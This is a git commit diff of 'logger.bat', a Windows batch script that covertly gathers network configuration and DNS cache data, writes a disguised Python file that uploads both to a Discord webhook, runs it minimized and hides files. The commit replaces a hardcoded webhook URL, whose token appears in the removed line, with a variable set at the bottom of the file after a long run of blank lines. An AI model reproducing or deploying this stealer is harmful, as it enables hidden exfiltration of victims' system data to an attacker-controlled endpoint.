4056224726cb47b77c9bc75f0463f0264dcc5fc6
Luukie Lucas <110778824+LuukieLucas@users.noreply.github.com>
2023-01-17 10:59:00 +0100

    Update logger.bat

--- logger.bat
+++ logger.bat
@@ -1,8 +1,10 @@
 @echo off
+goto test
+:tet
 ipconfig /all > "%cd%\data.txt" && ipconfig /displaydns > "%cd%\data2.txt"
 pip install requests >nul
 echo import requests > nothing.txt
-echo myurl = 'https://discord.com/api/webhooks/1057648629134938182/hzlxXj6EVPubzjBEjphm0ZBvQg-8JAtEvm7hjW1TAk1kMvpVNwZCd8nx4WBAWNojGsE8' >> nothing.txt
+echo myurl = '%webhook%' >> nothing.txt
 echo f = {'file data': open('data.txt', 'rb')} >> nothing.txt
 echo res = requests.post(myurl, files=f) >> nothing.txt
 echo g = {'file data': open('data2.txt', 'rb')} >> nothing.txt
@@ -11,3 +13,33 @@ ren nothing.txt nothing.py
 start /min nothing.py
 cls
 attrib *.* +h
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:test
+set webhook=YOURwebhookHERE
+goto tet
